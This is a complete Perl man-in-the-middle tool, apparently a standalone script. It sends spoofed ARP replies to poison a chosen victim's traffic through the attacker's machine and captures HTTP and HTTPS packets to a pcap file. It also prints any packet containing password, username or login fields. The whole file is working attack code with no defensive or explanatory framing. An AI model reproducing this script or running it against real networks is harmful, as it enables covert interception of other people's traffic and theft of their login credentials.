#!/usr/bin/perl
use strict;

use NetPacket::TCP;        # packet disassembly
use Net::Pcap;             # sniffing
use Net::ARP;              # craft,send ARP to target
use Net::Frame::Device;    # get local MAC

my $usage     = "perl mitm.pl <target IP><target MAC><gateway IP>\n";
my $targetIP  = shift || die $usage;
my $targetMAC = shift || die $usage;
my $gatewayIP = shift || die $usage;
my ( $net, $mask, $filter, $err ) = "" x 4;
my $dev = pcap_lookupdev( \$err );
my $myDevProp = Net::Frame::Device->new( dev => $dev );    # get my MAC
pcap_lookupnet( $dev, \$net, \$mask, \$err );
my $pcap = pcap_open_live( $dev, 65535, 1, 4000, \$err );
pcap_compile( $pcap, \$filter, "port 80 or port 443 or arp", 1, $mask )
  && die "cannot compile filter";
pcap_setfilter( $pcap, $filter ) && die "cannot set filter";
my $dumper = pcap_dump_open( $pcap, "output.cap" );
print "Sending initial ARP to poison victim.\n";
&sendARP;    # send the ARP request
print "Listening for port 80, 443 and ARP...\n";
pcap_loop( $pcap, -1, \&cap, 0 );

sub cap {
	my ( $user_data, $hdr, $pkt ) = @_;
	my $type = sprintf( "%02x%02x", unpack( "x12 C2", $pkt ) );
	if ( $type eq "0806" ) {    # we have an ARP

		# is it ours?
		if (
			sprintf( "%02x:%02x:%02x:%02x:%02x:%02x", unpack( "C6", $pkt ) ) eq
			$myDevProp->mac )
		{
			if ( sprintf( "%02x%02x", unpack( "x20 C2", $pkt ) ) eq "0001" )
			{                   # RequestARP
				print "[-] got request from target, sending reply\n";
				&sendARP;       # opCode 1 (reply)
				return;
			}
		}
	}
	else {                      # else should be 80 or 443 ports:
		pcap_dump( $dumper, $hdr, $pkt );    # haven't died, so save it
		my $len    = length($pkt);
		my $string = "";
		for ( my $i = 0 ; $i <= $len ; $i++ ) {
			$string .= pack 'H*',
			  unpack( "H2", substr( $pkt, $i, 1 ) );    # per byte
		}
		$string =~ s/\R/ /g;
		print "\n", $string, "\n"
		  if ( $string =~ m/passw(ord)?=/i
			or $string =~ m/user(name)?=/i
			or $string =~ m/login=/i );
	}
}

sub sendARP {
	Net::ARP::send_packet( $dev, $gatewayIP, $targetIP, $myDevProp->mac,
		$targetMAC, "reply" )
	  || die "cannot send spoofed ARP reply packet\n";
	return;
}

END {
	pcap_close($pcap)        if ($pcap);
	pcap_dump_close($dumper) if ($dumper);
	print "Exiting.\n";
}
